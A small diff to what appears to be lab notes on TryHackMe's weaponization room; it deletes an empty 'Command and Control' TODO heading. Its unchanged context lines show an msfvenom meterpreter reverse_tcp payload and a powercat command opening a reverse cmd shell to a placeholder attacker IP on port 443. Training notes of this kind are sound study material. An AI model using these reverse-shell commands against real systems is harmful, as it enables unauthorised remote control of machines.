@@ -120,10 +120,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-MACHINE-IP LPORT=443
 - We launch powercat `powershell -c "powercat -c ATTACKING-MACHINE-IPP -p 443 -e cmd"`
 - We should get a shell
  
-## Command and Control
-
-### TODO
-
 ## Resources
 
 - [TryHackMe - Weaponization](https://tryhackme.com/room/weaponization)
